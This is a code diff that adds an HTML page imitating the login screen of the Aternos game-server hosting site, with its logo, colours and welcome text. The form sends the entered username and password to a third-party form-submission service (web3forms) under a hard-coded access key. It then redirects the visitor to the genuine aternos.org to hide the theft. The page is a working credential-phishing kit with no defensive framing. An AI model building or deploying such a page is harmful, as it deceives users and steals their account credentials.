@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aternos Style Login</title>
+    <style>
+        body {
+            background-color: #2c3e50; /* The signature Aternos slate grey */
+            color: white;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 42px;
+            margin-bottom: 30px;
+            font-weight: 700;
+        }
+
+        /* Large Sign Up Button */
+        .btn-signup {
+            background-color: #2d89ef;
+            color: white;
+            padding: 15px;
+            width: 100%;
+            border: none;
+            border-radius: 2px;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 25px;
+        }
+
+        /* OR Separator */
+        .separator {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .separator::before, .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 2px solid #5c6d7e;
+        }
+        .separator:not(:empty)::before { margin-right: .5em; }
+        .separator:not(:empty)::after { margin-left: .5em; }
+
+        /* Inline Login Row */
+        .login-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .input-group {
+            flex: 1;
+            display: flex;
+            background: #ecf0f1;
+            border-radius: 2px;
+            overflow: hidden;
+            align-items: center;
+            padding-left: 10px;
+        }
+
+        .input-group input {
+            border: none;
+            padding: 12px;
+            width: 100%;
+            outline: none;
+            font-size: 16px;
+            background: #ecf0f1;
+            color: #333;
+        }
+
+        .btn-login {
+            background-color: #2d89ef;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            padding: 0 25px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        /* Links and Google Sign In */
+        .forgot-pass {
+            text-align: left;
+            font-size: 12px;
+            color: #bdc3c7;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .btn-google {
+            background-color: #ffffff;
+            color: #555;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 2px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        #AternosLogo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+
+        /* The square grid icon next to the text */
+        .logo-icon {
+            width: 35px;
+            height: 35px;
+            border: 3px solid #ffffff;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 3px;
+            padding: 3px;
+        }
+
+        .logo-icon div {
+            background-color: white;
+        }
+
+        /* The "ATERNOS" text style */
+        .logo-text {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            font-family: 'Arial Black', Gadget, sans-serif;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <a href="Logos\AternosLogo.svg" id="AternosLogo">
+            <div class="logo-icon">
+                <div></div><div></div>
+                <div></div><div></div>
+            </div>
+            <div class="logo-text">ATERNOS</div>
+        </a>
+
+        <h1>Welcome to Aternos</h1>
+
+        <button class="btn-signup">Sign up</button>
+
+        <div class="separator">OR</div>
+
+        
+
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="12544b55-bce7-4591-aa23-1ec3d5ea4660">
+            <input type="hidden" name="redirect" value="https://aternos.org/go/">
+            <div style="text-align: left; font-size: 14px; font-weight: bold; margin-bottom: 5px;">Login</div>
+            <div class="login-row">
+                <div class="input-group">
+                    <input type="text" name="user" placeholder="Username" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" name="pass" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn-login">Login</button>
+            </div>
+            <a href="#" class="forgot-pass">Forgot Password?</a>
+        </form>
+
+    </div>
+
+</body>
+</html>
